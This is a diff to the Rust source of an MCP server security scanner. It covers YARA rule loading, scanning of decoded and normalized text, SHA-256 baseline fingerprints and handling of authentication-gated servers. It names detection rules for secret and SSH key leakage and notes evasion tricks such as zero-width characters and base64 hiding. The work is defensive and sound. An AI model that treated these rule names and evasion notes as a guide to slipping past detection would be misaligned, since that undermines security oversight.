@@ -28,23 +28,6 @@ type YaraRules = Rules;
 #[cfg(not(feature = "yara-x-scanning"))]
 type YaraRules = ();
 
-/// Map rule names to their file names for consistent naming
-fn rule_name_to_file_name(rule_name: &str) -> Option<String> {
-    match rule_name {
-        // secrets_leakage.yar rules
-        "SecretsLeakage" | "SSHKeyExposure" | "PEMFileAccess" | "EnvironmentVariableLeakage" => {
-            Some("secrets_leakage".to_string())
-        }
-        // cross_origin_escalation.yar rules
-        "CrossOriginEscalation"
-        | "CrossDomainContamination"
-        | "DomainOutlier"
-        | "MixedSecuritySchemes" => Some("cross_origin_escalation".to_string()),
-        // Add more mappings as needed
-        _ => None,
-    }
-}
-
 /// Generate descriptive context messages based on rule names
 fn generate_context_message(item_type: &str, rule_name: &str) -> String {
     match rule_name {
@@ -77,6 +60,77 @@ fn generate_context_message(item_type: &str, rule_name: &str) -> String {
 }
 
 /// Check if YARA is available and enabled
+/// Wall-clock budget for scanning one server during a config scan.
+///
+/// Replaces a single 300-second budget shared by the whole fan-out. Because the
+/// servers scan concurrently, a per-server budget costs roughly the same
+/// wall-clock time while guaranteeing that every server produces a result — a
+/// shared deadline discarded them all.
+const PER_SERVER_SCAN_BUDGET_SECS: u64 = 300;
+
+/// Locate the YARA rules directory.
+///
+/// This used to be the bare relative path `"rules"`, resolved against the
+/// process working directory. A binary from `cargo install ramparts` run
+/// anywhere other than the source checkout therefore loaded zero rules, logged
+/// nothing, and still reported `status: "passed"` — a silent fail-open. Search
+/// an explicit override, then locations that travel with the binary, and only
+/// then the working directory.
+///
+/// Returns `None` when no candidate holds a `pre` subdirectory, which the
+/// caller treats as a loud error rather than an empty rule set.
+pub fn resolve_rules_dir() -> Option<std::path::PathBuf> {
+    let mut candidates: Vec<std::path::PathBuf> = Vec::new();
+
+    // 1. Explicit override always wins, for packagers and for tests.
+    if let Ok(dir) = std::env::var("RAMPARTS_RULES_DIR") {
+        if !dir.trim().is_empty() {
+            candidates.push(std::path::PathBuf::from(dir));
+        }
+    }
+
+    // 2. Alongside the executable, and the conventional install prefix one
+    //    level up. These travel with an installed binary.
+    if let Ok(exe) = std::env::current_exe() {
+        if let Some(exe_dir) = exe.parent() {
+            candidates.push(exe_dir.join("rules"));
+            if let Some(prefix) = exe_dir.parent() {
+                candidates.push(prefix.join("share").join("ramparts").join("rules"));
+            }
+        }
+    }
+
+    // 3. Per-user rules.
+    if let Some(home) = dirs::home_dir() {
+        candidates.push(home.join(".ramparts").join("rules"));
+    }
+
+    // 4. The working directory, which is what a source checkout uses.
+    candidates.push(std::path::PathBuf::from("rules"));
+
+    candidates.into_iter().find(|dir| dir.join("pre").is_dir())
+}
+
+/// Whether the server declared a capability during initialize.
+///
+/// Servers commonly implement tools only. Calling `resources/list` on such a
+/// server returns "method not found", which — now that list errors propagate
+/// instead of collapsing to an empty vector — would be recorded as a scan
+/// failure for a perfectly healthy server. Ask only for what the handshake
+/// advertised.
+///
+/// When the server declared nothing at all (an older server, or a transport
+/// that gave us no capability object), fall back to asking for everything so we
+/// never under-report against a server that would have answered.
+fn server_declares(server_info: Option<&MCPServerInfo>, capability: &str) -> bool {
+    match server_info {
+        Some(info) if !info.capabilities.is_empty() => {
+            info.capabilities.iter().any(|c| c == capability)
+        }
+        _ => true,
+    }
+}
+
 fn is_yara_available(config_enabled: bool) -> bool {
     if !config_enabled {
         return false;
@@ -228,6 +282,10 @@ pub struct ThreatRules {
     post_scan_rules: Vec<Arc<YaraRules>>,
     rules_dir: String,
     rule_metadata: HashMap<String, RuleMetadata>,
+    /// YARA rule identifier → file stem of the .yar file it was loaded
+    /// from. Built at load time so new rule files dropped into
+    /// `rules/pre` or `rules/post` are mapped with no code changes.
+    rule_file_map: HashMap<String, String>,
     memory_usage_bytes: usize,
     last_load_time: std::time::Instant,
 }
@@ -265,6 +323,7 @@ impl ThreatRules {
             post_scan_rules: Vec::new(),
             rules_dir: rules_dir.to_string(),
             rule_metadata: HashMap::new(),
+            rule_file_map: HashMap::new(),
             memory_usage_bytes: 0,
             last_load_time: start_time,
         }
@@ -279,6 +338,7 @@ impl ThreatRules {
             post_scan_rules: Vec::new(),
             rules_dir: rules_dir.to_string(),
             rule_metadata: HashMap::new(),
+            rule_file_map: HashMap::new(),
             memory_usage_bytes: 0,
             last_load_time: start_time,
         };
@@ -365,11 +425,22 @@ impl ThreatRules {
                         let rule_content = std::fs::read_to_string(path_str)
                             .map_err(|e| anyhow!("Failed to read rule file {}: {}", path_str, e))?;
 
-                        // Compile the rule using YARA-X compiler
+                        // Compile the rule using YARA-X compiler.
+                        //
+                        // A file that does not compile must be a hard error.
+                        // Warning and continuing silently dropped every rule in
+                        // the file, so a stray `*/` inside a comment could
+                        // remove a whole detection category while scans still
+                        // reported "passed" — the same fail-open shape as a
+                        // missing rules directory.
                         let mut compiler = yara_x::Compiler::new();
                         if let Err(e) = compiler.add_source(rule_content.as_str()) {
-                            warn!("Failed to add rule source from {}: {}", path_str, e);
-                            continue;
+                            return Err(anyhow!(
+                                "YARA rule file {} failed to compile, so its rules would be \
+                                 silently absent from every scan: {}",
+                                path_str,
+                                e
+                            ));
                         }
 
                         let rule = compiler.build();
@@ -378,6 +449,14 @@ impl ThreatRules {
                             .and_then(|s| s.to_str())
                             .unwrap_or("unknown")
                             .to_string();
+
+                        // Record which file each compiled rule identifier came
+                        // from so scan results can report their rule_file
+                        // without a hand-maintained name table.
+                        for compiled_rule in rule.iter() {
+                            self.rule_file_map
+                                .insert(compiled_rule.identifier().to_string(), rule_name.clone());
+                        }
 
                         debug!("Loaded YARA-X rule: {} (phase: {})", path.display(), phase);
 
@@ -509,6 +588,19 @@ impl ThreatRules {
         Self::scan_with_rules_enhanced_internal(text, context, &self.post_scan_rules, "post")
     }
 
+    /// Maps a YARA rule identifier (yara-x's `Rule::identifier`) back to
+    /// the file stem of the .yar file it was loaded from. The map is built
+    /// at load time from the compiled rules, so any rule file dropped into
+    /// the rules directory is covered with no code changes.
+    ///
+    /// NOTE: synthetic findings (skill-parser heuristics like
+    /// `AgentskillsNameMismatch`, the baseline-diff `MCPConfigChanged`,
+    /// OSV's `VulnerableDependency`) never consult this — they hard-code
+    /// `rule_file` on construction.
+    pub fn rule_file_for(&self, rule_identifier: &str) -> Option<String> {
+        self.rule_file_map.get(rule_identifier).cloned()
+    }
+
     /// Gets statistics about loaded rules
     pub fn stats(&self) -> RuleStats {
         let mut pre_scan_rules = Vec::new();
@@ -588,6 +680,7 @@ impl Clone for ThreatRules {
             post_scan_rules: self.post_scan_rules.clone(),
             rules_dir: self.rules_dir.clone(),
             rule_metadata: self.rule_metadata.clone(),
+            rule_file_map: self.rule_file_map.clone(),
             memory_usage_bytes: self.memory_usage_bytes,
             last_load_time: self.last_load_time,
         }
@@ -607,6 +700,17 @@ impl YaraScanner {
         Ok(Self { scanner, phase })
     }
 
+    /// Number of compiled rule files available for this capability's phase.
+    /// Zero means pattern scanning cannot detect anything, which callers
+    /// surface at warn level rather than reporting a clean scan.
+    pub fn rule_count(&self) -> usize {
+        let stats = self.scanner.stats();
+        match self.phase {
+            ScanPhase::PreScan => stats.pre_scan_count,
+            ScanPhase::PostScan => stats.post_scan_count,
+        }
+    }
+
     /// Generic YARA scanning method for any item type that implements `BatchScannableItem`
     fn scan_items_with_yara<T>(&self, items: &[T], phase: ScanPhase) -> Vec<YaraScanResult>
     where
@@ -618,11 +722,28 @@ impl YaraScanner {
             let item_text = Self::format_item_for_yara_scan(item);
             let context = format!("{} '{}'", T::item_type(), item.name());
 
-            // Use enhanced scanning methods that return metadata
+            // Scan the raw text first (rules like UnicodeSteganography need
+            // the raw bytes), then every normalized/decoded view of it, so a
+            // keyword split by zero-width chars, folded into homoglyphs, or
+            // hidden in a base64/hex blob still hits the same rules (AST08).
+            // Matches are deduped by rule name across views.
             #[cfg(feature = "yara-x-scanning")]
-            let enhanced_matches = match phase {
-                ScanPhase::PreScan => self.scanner.pre_scan(&item_text, &context),
-                ScanPhase::PostScan => self.scanner.post_scan(&item_text, &context),
+            let enhanced_matches = {
+                let scan_one = |text: &str| match phase {
+                    ScanPhase::PreScan => self.scanner.pre_scan(text, &context),
+                    ScanPhase::PostScan => self.scanner.post_scan(text, &context),
+                };
+                let mut matches = scan_one(&item_text);
+                let mut seen: std::collections::HashSet<String> =
+                    matches.iter().map(|m| m.rule_name.clone()).collect();
+                for view in crate::normalize::additional_scan_views(&item_text) {
+                    for m in scan_one(&view) {
+                        if seen.insert(m.rule_name.clone()) {
+                            matches.push(m);
+                        }
+                    }
+                }
+                matches
             };
 
             #[cfg(not(feature = "yara-x-scanning"))]
@@ -638,8 +759,7 @@ impl YaraScanner {
 
                 // Store YARA results for each match with metadata
                 for match_info in enhanced_matches {
-                    let yara_result =
-                        Self::create_yara_result_with_metadata::<T>(item, &match_info);
+                    let yara_result = self.create_yara_result_with_metadata::<T>(item, &match_info);
                     results.push(yara_result);
                 }
             }
@@ -647,18 +767,26 @@ impl YaraScanner {
         results
     }
 
-    /// Format an item for YARA scanning with specialized logic per type
+    /// Format an item for YARA scanning. We feed YARA the same descriptive
+    /// text the LLM analyzer sees (`format_for_analysis`) so rules that
+    /// pattern-match on tool/prompt/skill bodies actually have content to
+    /// match against. Previously this returned just `"PROMPT: <name>"`,
+    /// which meant body-pattern rules (the new skill rules in particular,
+    /// but also `command_injection.yar` against prompts) silently never
+    /// fired because there was nothing to scan beyond the name.
     fn format_item_for_yara_scan<T>(item: &T) -> String
     where
         T: crate::security::BatchScannableItem,
     {
-        // For YARA scanning, we want a simple format without numbering
-        // to avoid confusion and focus on the actual content
-        format!("{}: {}", T::item_type().to_uppercase(), item.name())
+        item.format_for_analysis(0)
     }
 
     /// Create a YARA scan result with original rule metadata
-    fn create_yara_result_with_metadata<T>(item: &T, match_info: &YaraMatchInfo) -> YaraScanResult
+    fn create_yara_result_with_metadata<T>(
+        &self,
+        item: &T,
+        match_info: &YaraMatchInfo,
+    ) -> YaraScanResult
     where
         T: crate::security::BatchScannableItem,
     {
@@ -666,11 +794,13 @@ impl YaraScanner {
             target_type: T::item_type().to_string(),
             target_name: item.name().to_string(),
             rule_name: match_info.rule_name.clone(),
-            rule_file: rule_name_to_file_name(&match_info.rule_name),
+            rule_file: self.scanner.rule_file_for(&match_info.rule_name),
             matched_text: None,
             context: generate_context_message(T::item_type(), &match_info.rule_name),
             rule_metadata: match_info.metadata.clone(),
             owasp_tags: crate::taxonomy::tags_for_yara_rule(&match_info.rule_name),
+            installed_version: None,
+            fixed_version: None,
             phase: None,
             rules_executed: None,
             security_issues_detected: None,
@@ -717,7 +847,7 @@ impl Scanner for YaraScanner {
                 for result in &tool_results {
                     triggered_rules.insert(result.rule_name.clone());
                     // Map YARA rule name back to file name for consistent comparison
-                    if let Some(file_name) = rule_name_to_file_name(&result.rule_name) {
+                    if let Some(file_name) = self.scanner.rule_file_for(&result.rule_name) {
                         triggered_file_names.insert(file_name);
                     } else {
                         // Fallback: use the rule name itself if no mapping found
@@ -726,7 +856,7 @@ impl Scanner for YaraScanner {
                 }
                 for result in &prompt_results {
                     triggered_rules.insert(result.rule_name.clone());
-                    if let Some(file_name) = rule_name_to_file_name(&result.rule_name) {
+                    if let Some(file_name) = self.scanner.rule_file_for(&result.rule_name) {
                         triggered_file_names.insert(file_name);
                     } else {
                         triggered_file_names.insert(result.rule_name.clone());
@@ -734,7 +864,7 @@ impl Scanner for YaraScanner {
                 }
                 for result in &resource_results {
                     triggered_rules.insert(result.rule_name.clone());
-                    if let Some(file_name) = rule_name_to_file_name(&result.rule_name) {
+                    if let Some(file_name) = self.scanner.rule_file_for(&result.rule_name) {
                         triggered_file_names.insert(file_name);
                     } else {
                         triggered_file_names.insert(result.rule_name.clone());
@@ -759,6 +889,8 @@ impl Scanner for YaraScanner {
                     ),
                     rule_metadata: None,
                     owasp_tags: Vec::new(),
+                    installed_version: None,
+                    fixed_version: None,
                     phase: Some("pre-scan".to_string()),
                     rules_executed: if stats.pre_scan_rules.is_empty() {
                         None
@@ -777,7 +909,7 @@ impl Scanner for YaraScanner {
                             .into_iter()
                             .map(|rule_name| {
                                 // Get the file name for this rule
-                                if let Some(file_name) = rule_name_to_file_name(&rule_name) {
+                                if let Some(file_name) = self.scanner.rule_file_for(&rule_name) {
                                     format!("{file_name}:{rule_name}")
                                 } else {
                                     rule_name
@@ -822,7 +954,7 @@ impl Scanner for YaraScanner {
 
                 for result in &tool_results {
                     triggered_rules.insert(result.rule_name.clone());
-                    if let Some(file_name) = rule_name_to_file_name(&result.rule_name) {
+                    if let Some(file_name) = self.scanner.rule_file_for(&result.rule_name) {
                         triggered_file_names.insert(file_name);
                     } else {
                         triggered_file_names.insert(result.rule_name.clone());
@@ -830,7 +962,7 @@ impl Scanner for YaraScanner {
                 }
                 for result in &prompt_results {
                     triggered_rules.insert(result.rule_name.clone());
-                    if let Some(file_name) = rule_name_to_file_name(&result.rule_name) {
+                    if let Some(file_name) = self.scanner.rule_file_for(&result.rule_name) {
                         triggered_file_names.insert(file_name);
                     } else {
                         triggered_file_names.insert(result.rule_name.clone());
@@ -838,7 +970,7 @@ impl Scanner for YaraScanner {
                 }
                 for result in &resource_results {
                     triggered_rules.insert(result.rule_name.clone());
-                    if let Some(file_name) = rule_name_to_file_name(&result.rule_name) {
+                    if let Some(file_name) = self.scanner.rule_file_for(&result.rule_name) {
                         triggered_file_names.insert(file_name);
                     } else {
                         triggered_file_names.insert(result.rule_name.clone());
@@ -863,6 +995,8 @@ impl Scanner for YaraScanner {
                     ),
                     rule_metadata: None,
                     owasp_tags: Vec::new(),
+                    installed_version: None,
+                    fixed_version: None,
                     phase: Some("post-scan".to_string()),
                     rules_executed: if stats.post_scan_rules.is_empty() {
                         None
@@ -881,7 +1015,7 @@ impl Scanner for YaraScanner {
                             .into_iter()
                             .map(|rule_name| {
                                 // Get the file name for this rule
-                                if let Some(file_name) = rule_name_to_file_name(&rule_name) {
+                                if let Some(file_name) = self.scanner.rule_file_for(&rule_name) {
                                     format!("{file_name}:{rule_name}")
                                 } else {
                                     rule_name
@@ -938,23 +1072,57 @@ impl MCPScanner {
         // Set up middleware chain with dynamic YARA capabilities
         let mut middleware_chain = ScannerChain::new();
 
-        // Fixed rules directory
-        let rules_dir = "rules".to_string();
+        // Resolve the rules directory rather than assuming the working
+        // directory holds one, and be loud when nothing is found.
+        match resolve_rules_dir() {
+            Some(dir) => {
+                let rules_dir = dir.to_string_lossy().to_string();
+                debug!("Using YARA rules directory: {}", rules_dir);
 
-        // Add dynamic YARA pre-scan capability
-        if let Ok(pre_cap) = YaraScanner::new(&rules_dir, ScanPhase::PreScan) {
-            middleware_chain.add(Box::new(pre_cap));
-            debug!("{}", messages::YARA_PRE_SCAN_LOADED);
-        } else {
-            warn!("{}", messages::YARA_PRE_SCAN_FAILED);
-        }
+                match YaraScanner::new(&rules_dir, ScanPhase::PreScan) {
+                    Ok(pre_cap) => {
+                        if pre_cap.rule_count() == 0 {
+                            // An empty rule set passes every scan. Say so at
+                            // warn level, not debug.
+                            warn!(
+                                "YARA pre-scan directory '{}/pre' compiled 0 rules. Pattern \
+                                 scanning is effectively disabled for this run.",
+                                rules_dir
+                            );
+                        } else {
+                            debug!("{}", messages::YARA_PRE_SCAN_LOADED);
+                        }
+                        middleware_chain.add(Box::new(pre_cap));
+                    }
+                    Err(e) => warn!("{}: {}", messages::YARA_PRE_SCAN_FAILED, e),
+                }
 
-        // Add dynamic YARA post-scan capability
-        if let Ok(post_cap) = YaraScanner::new(&rules_dir, ScanPhase::PostScan) {
-            middleware_chain.add(Box::new(post_cap));
-            debug!("{}", messages::YARA_POST_SCAN_LOADED);
-        } else {
-            warn!("{}", messages::YARA_POST_SCAN_FAILED);
+                // Only register the post-scan phase when post rules exist.
+                // Registering it unconditionally made every report carry a
+                // "0 rules executed / passed" summary, which reads as a clean
+                // result rather than an absent one.
+                if std::path::Path::new(&rules_dir).join("post").is_dir() {
+                    match YaraScanner::new(&rules_dir, ScanPhase::PostScan) {
+                        Ok(post_cap) => {
+                            debug!("{}", messages::YARA_POST_SCAN_LOADED);
+                            middleware_chain.add(Box::new(post_cap));
+                        }
+                        Err(e) => warn!("{}: {}", messages::YARA_POST_SCAN_FAILED, e),
+                    }
+                } else {
+                    debug!(
+                        "No post-scan rules at '{}/post'; skipping the post-scan phase",
+                        rules_dir
+                    );
+                }
+            }
+            None => {
+                warn!(
+                    "No YARA rules directory found. Pattern-based detection is DISABLED for \
+                     this run. Searched $RAMPARTS_RULES_DIR, the executable directory, \
+                     ~/.ramparts/rules, and ./rules. Set RAMPARTS_RULES_DIR to override."
+                );
+            }
         }
 
         // Add cross-origin escalation scanner (pre-scan)
@@ -968,6 +1136,204 @@ impl MCPScanner {
             middleware_chain,
             mcp_client: McpClient::with_http_timeout(http_timeout),
         })
+    }
+
+    /// Run the security-analysis pipeline against pre-fetched MCP data.
+    ///
+    /// This is the analyze half of `scan_single`, factored out so callers
+    /// can drive it directly with data they fetched themselves — useful
+    /// when the live MCP server requires upstream credentials the scanner
+    /// process doesn't have but the caller does. The HTTP server exposes
+    /// this path via `POST /v1/ramparts/analyze`.
+    ///
+    /// The function runs every analysis stage `scan_single` runs:
+    ///   - pre-scan middleware hooks (mutate scan_data; cross-origin
+    ///     analysis, etc.)
+    ///   - scanner-config load (falls through to defaults if absent)
+    ///   - `return_prompts` branch (build LLM prompts and return without
+    ///     calling the LLM) OR the security-scan branch (YARA + LLM
+    ///     analysis on tools/prompts/resources)
+    ///   - post-scan middleware hooks
+    ///
+    /// `url` is recorded on the result for downstream identification only —
+    /// no network call is made with it. Pass an empty string when the
+    /// caller has no URL context (e.g. analyzing tool definitions stored
+    /// in a database).
+    pub async fn analyze_scan_data(
+        &self,
+        url: &str,
+        mut scan_data: ScanData,
+        options: &ScanOptions,
+    ) -> Result<ScanResult> {
+        let timer = Timer::start();
+        let mut result = ScanResult::new(url.to_string());
+
+        // === PRE-SCAN HOOKS ===
+        self.middleware_chain.run_pre_scan(&mut scan_data);
+        scan_data
+            .yara_results
+            .extend(crate::baseline::check_tool_drift(url, &scan_data.tools));
+
+        result.status = ScanStatus::Success;
+        result.server_info.clone_from(&scan_data.server_info);
+        result.tools.clone_from(&scan_data.tools);
+        result.resources.clone_from(&scan_data.resources);
+        result.prompts.clone_from(&scan_data.prompts);
+        result.errors.append(&mut scan_data.fetch_errors);
+
+        // Load scanner configuration — fall back to defaults if missing,
+        // matching `scan_single`'s behaviour.
+        let config_manager = crate::config::ScannerConfigManager::new();
+        let scanner_config = match config_manager.load_config() {
+            Ok(config) => config,
+            Err(e) => {
+                warn!("Failed to load scanner config, using defaults: {}", e);
+                result.errors.push(format!("Config loading failed: {e}"));
+                ScannerConfig::default()
+            }
+        };
+
+        if options.return_prompts {
+            // Build LLM prompts without actually calling the LLM. Same
+            // batching logic scan_single uses — kept in one place so the
+            // two paths produce identical prompts for the same inputs.
+            result.llm_prompts = Some(Self::build_llm_prompts(&scan_data, &scanner_config));
+            result.yara_results = std::mem::take(&mut scan_data.yara_results);
+        } else {
+            // Real security analysis: YARA + LLM batches across tools,
+            // prompts, and resources.
+            let security_scanner = if scanner_config.security.enabled {
+                SecurityScanner::with_config(scanner_config)
+            } else {
+                SecurityScanner::default()
+            };
+            let mut security_result = SecurityScanResult::new();
+
+            match security_scanner
+                .scan_tools_batch(&scan_data.tools, options.detailed)
+                .await
+            {
+                Ok((tool_issues, analysis_details)) => {
+                    security_result.add_tool_issues(tool_issues);
+                    for (tool_name, details) in analysis_details {
+                        security_result.add_tool_analysis_details(tool_name, details);
+                    }
+                }
+                Err(e) => warn!("Failed to batch scan tools for security issues: {}", e),
+            }
+
+            if !scan_data.prompts.is_empty() {
+                match security_scanner
+                    .scan_prompts_batch(&scan_data.prompts, options.detailed)
+                    .await
+                {
+                    Ok(prompt_issues) => security_result.add_prompt_issues(prompt_issues),
+                    Err(e) => {
+                        warn!("Failed to batch scan prompts for security issues: {}", e)
+                    }
+                }
+            }
+
+            if !scan_data.resources.is_empty() {
+                match security_scanner
+                    .scan_resources_batch(&scan_data.resources, options.detailed)
+                    .await
+                {
+                    Ok(resource_issues) => security_result.add_resource_issues(resource_issues),
+                    Err(e) => {
+                        warn!("Failed to batch scan resources for security issues: {}", e);
+                    }
+                }
+            }
+
+            result.security_issues = Some(security_result);
+
+            // === POST-SCAN HOOKS ===
+            self.middleware_chain.run_post_scan(&mut scan_data);
+            // Middleware may have appended new yara hits — move into
+            // result (no clone needed, scan_data is not used after this).
+            result.yara_results = std::mem::take(&mut scan_data.yara_results);
+        }
+
+        result.response_time_ms = timer.elapsed_ms();
+        debug!("Analysis completed in {}ms", result.response_time_ms);
+        Ok(result)
+    }
+
+    /// Build the LLM prompts the security scanner would normally send. Used
+    /// by both `scan_single` and `analyze_scan_data` when `return_prompts`
+    /// is set — extracted so the two paths stay byte-for-byte identical for
+    /// the same inputs.
+    fn build_llm_prompts(scan_data: &ScanData, scanner_config: &ScannerConfig) -> Vec<LlmPrompt> {
+        let mut prompts: Vec<LlmPrompt> = Vec::new();
+        let batch_size = scanner_config.scanner.llm_batch_size as usize;
+        let security_scanner = SecurityScanner::with_config(scanner_config.clone());
+
+        if !scan_data.tools.is_empty() {
+            for (batch_index, chunk) in scan_data.tools.chunks(batch_size).enumerate() {
+                let tools_info = chunk
+                    .iter()
+                    .enumerate()
+                    .map(|(i, tool)| tool.format_for_analysis(i))
+                    .collect::<String>();
+                let prompt_text = SecurityScanner::create_tools_analysis_prompt(&tools_info);
+                let item_names = chunk.iter().map(|t| t.name.clone()).collect();
+                let request_body = security_scanner.build_llm_request_body(&prompt_text);
+                let endpoint = security_scanner.get_endpoint();
+                prompts.push(LlmPrompt {
+                    target_type: "tool".to_string(),
+                    batch_index,
+                    prompt: prompt_text,
+                    request_body: Some(request_body),
+                    endpoint,
+                    item_names,
+                });
+            }
+        }
+        if !scan_data.prompts.is_empty() {
+            for (batch_index, chunk) in scan_data.prompts.chunks(batch_size).enumerate() {
+                let prompts_info = chunk
+                    .iter()
+                    .enumerate()
+                    .map(|(i, p)| p.format_for_analysis(i))
+                    .collect::<String>();
+                let prompt_text = SecurityScanner::create_prompts_analysis_prompt(&prompts_info);
+                let item_names = chunk.iter().map(|p| p.name.clone()).collect();
+                let request_body = security_scanner.build_llm_request_body(&prompt_text);
+                let endpoint = security_scanner.get_endpoint();
+                prompts.push(LlmPrompt {
+                    target_type: "prompt".to_string(),
+                    batch_index,
+                    prompt: prompt_text,
+                    request_body: Some(request_body),
+                    endpoint,
+                    item_names,
+                });
+            }
+        }
+        if !scan_data.resources.is_empty() {
+            for (batch_index, chunk) in scan_data.resources.chunks(batch_size).enumerate() {
+                let resources_info = chunk
+                    .iter()
+                    .enumerate()
+                    .map(|(i, r)| r.format_for_analysis(i))
+                    .collect::<String>();
+                let prompt_text =
+                    SecurityScanner::create_resources_analysis_prompt(&resources_info);
+                let item_names = chunk.iter().map(|r| r.name.clone()).collect();
+                let request_body = security_scanner.build_llm_request_body(&prompt_text);
+                let endpoint = security_scanner.get_endpoint();
+                prompts.push(LlmPrompt {
+                    target_type: "resource".to_string(),
+                    batch_index,
+                    prompt: prompt_text,
+                    request_body: Some(request_body),
+                    endpoint,
+                    item_names,
+                });
+            }
+        }
+        prompts
     }
 
     /// Scan a single MCP server
@@ -1001,6 +1367,12 @@ impl MCPScanner {
             Ok(mut scan_data) => {
                 // === PRE-SCAN HOOKS ===
                 self.middleware_chain.run_pre_scan(&mut scan_data);
+                scan_data
+                    .yara_results
+                    .extend(crate::baseline::check_tool_drift(
+                        &normalized_url,
+                        &scan_data.tools,
+                    ));
 
                 result.status = ScanStatus::Success;
                 result.server_info.clone_from(&scan_data.server_info);
@@ -1175,9 +1547,18 @@ impl MCPScanner {
                 }
             }
             Err(e) => {
-                result.status = ScanStatus::Failed(e.to_string());
-                result.add_error(error_utils::format_error("Scan operation", &e.to_string()));
-                warn!("Scan failed: [\x1b[1m{}\x1b[0m]", e);
+                // An auth-gated server is not a broken server. Classify it so
+                // the report says "needs credentials" instead of parking it in
+                // the failed bucket, indistinguishable from a real outage.
+                if let Some(challenge) = e.downcast_ref::<crate::mcp_client::AuthChallenge>() {
+                    let summary = challenge.summary();
+                    warn!("Scan requires authentication: {}", summary);
+                    result.status = ScanStatus::AuthenticationError(summary);
+                } else {
+                    result.status = ScanStatus::Failed(e.to_string());
+                    result.add_error(error_utils::format_error("Scan operation", &e.to_string()));
+                    warn!("Scan failed: [\x1b[1m{}\x1b[0m]", e);
+                }
             }
         }
 
@@ -1298,6 +1679,12 @@ impl MCPScanner {
             Ok((session, mut scan_data)) => {
                 // Apply the same middleware chain as HTTP scanning
                 self.middleware_chain.run_pre_scan(&mut scan_data);
+                scan_data
+                    .yara_results
+                    .extend(crate::baseline::check_tool_drift(
+                        &display_url,
+                        &scan_data.tools,
+                    ));
 
                 // === SECURITY ANALYSIS ===
                 // Load scanner configuration for security analysis
@@ -1458,33 +1845,59 @@ impl MCPScanner {
                 .unwrap_or_else(|| std::path::PathBuf::from(".ramparts/mcp-baseline.json"))
         }
 
+        /// Fingerprint a server definition for baseline drift detection.
+        ///
+        /// This used `DefaultHasher`, which has two disqualifying properties
+        /// for a security control. The standard library does not guarantee its
+        /// output is stable across Rust releases, so a toolchain upgrade
+        /// silently invalidated every stored baseline and raised spurious HIGH
+        /// "MCPConfigChanged" findings. And a 64-bit non-cryptographic hash is
+        /// cheap to collide, so an attacker editing a config could keep the
+        /// stored fingerprint intact — defeating the exact post-approval-swap
+        /// check this exists to catch.
+        ///
+        /// Fields are length-prefixed so `name="ab", url="c"` cannot collide
+        /// with `name="a", url="bc"`.
         fn compute_server_fingerprint(server: &MCPServerConfig) -> String {
-            use std::hash::{Hash, Hasher};
-            let mut s = String::new();
-            if let Some(name) = &server.name {
-                s.push_str(name);
-            }
-            if let Some(url) = &server.url {
-                s.push_str(url);
-            }
-            if let Some(cmd) = &server.command {
-                s.push_str(cmd);
-            }
-            if let Some(args) = &server.args {
-                s.push_str(&args.join(" "));
-            }
+            use sha2::{Digest, Sha256};
+
+            let mut hasher = Sha256::new();
+            let mut field = |label: &str, value: &str| {
+                hasher.update(label.as_bytes());
+                hasher.update(b"\x1f");
+                hasher.update((value.len() as u64).to_le_bytes());
+                hasher.update(value.as_bytes());
+                hasher.update(b"\x1e");
+            };
+
+            field("name", server.name.as_deref().unwrap_or(""));
+            field("url", server.url.as_deref().unwrap_or(""));
+            field("command", server.command.as_deref().unwrap_or(""));
+            field(
+                "args",
+                &server
+                    .args
+                    .as_ref()
+                    .map(|a| a.join("\x1f"))
+                    .unwrap_or_default(),
+            );
             if let Some(env) = &server.env {
                 let mut kv: Vec<_> = env.iter().collect();
                 kv.sort_by(|a, b| a.0.cmp(b.0));
                 for (k, v) in kv {
-                    s.push_str(k);
-                    s.push('=');
-                    s.push_str(v);
+                    field(k, v);
                 }
             }
-            let mut hasher = std::collections::hash_map::DefaultHasher::new();
-            s.hash(&mut hasher);
-            format!("{:016x}", hasher.finish())
+
+            format!("{:x}", hasher.finalize())
+        }
+
+        /// Baselines written by the old `DefaultHasher` scheme are 16 hex
+        /// characters; sha256 fingerprints are 64. An old entry cannot be
+        /// compared against a new one, so treat it as "re-baseline needed"
+        /// rather than reporting a change that did not happen.
+        fn is_legacy_fingerprint(stored: &str) -> bool {
+            stored.len() != 64
         }
 
         let baseline_path = get_baseline_path();
@@ -1499,7 +1912,8 @@ impl MCPScanner {
 
         // Prepare YARA rules engine for config scanning (feature-gated)
         #[cfg(feature = "yara-x-scanning")]
-        let pre_rules_engine = ThreatRules::new("rules").ok(); // compile once for config scan
+        let pre_rules_engine =
+            resolve_rules_dir().and_then(|dir| ThreatRules::new(&dir.to_string_lossy()).ok()); // compile once
 
         if let Some(ref servers) = config.servers {
             for server in servers {
@@ -1564,11 +1978,13 @@ impl MCPScanner {
                                 .clone()
                                 .unwrap_or_else(|| server.to_display_url()),
                             rule_name: m.rule_name.clone(),
-                            rule_file: rule_name_to_file_name(&m.rule_name),
+                            rule_file: engine.rule_file_for(&m.rule_name),
                             matched_text: None,
                             context: generate_context_message("server", &m.rule_name),
                             rule_metadata: m.metadata.clone(),
                             owasp_tags: crate::taxonomy::tags_for_yara_rule(&m.rule_name),
+                            installed_version: None,
+                            fixed_version: None,
                             phase: Some("pre-config".to_string()),
                             rules_executed: None,
                             security_issues_detected: None,
@@ -1583,6 +1999,19 @@ impl MCPScanner {
                 let fp = compute_server_fingerprint(server);
                 match baseline_map.get(&key) {
                     Some(stored) if stored == &fp => { /* unchanged */ }
+                    // Migrate a pre-sha256 entry in place. Reporting it as a
+                    // change would flag every server on the first run after
+                    // this upgrade.
+                    Some(stored) if is_legacy_fingerprint(stored) => {
+                        debug!(
+                            "Upgrading legacy baseline fingerprint for '{}' to sha256",
+                            key
+                        );
+                        baseline_map.insert(key.clone(), fp.clone());
+                        if let Ok(serialized) = serde_json::to_string_pretty(&baseline_map) {
+                            let _ = std::fs::write(&baseline_path, serialized);
+                        }
+                    }
                     Some(_different) => {
                         prefindings.push(YaraScanResult {
                             target_type: "server".to_string(),
@@ -1610,6 +2039,8 @@ impl MCPScanner {
                                 tags: vec!["baseline".to_string()],
                             }),
                             owasp_tags: crate::taxonomy::tags_for_yara_rule("MCPConfigChanged"),
+                            installed_version: None,
+                            fixed_version: None,
                             phase: Some("pre-config".to_string()),
                             rules_executed: None,
                             security_issues_detected: None,
@@ -1697,52 +2128,91 @@ impl MCPScanner {
                             }
                         };
 
-                        // Scan the MCP server - HTTP or STDIO
-                        let result = if let Some(url) = server.scan_url() {
-                            // HTTP server scanning
-                            match scanner.scan_single(url, server_options).await {
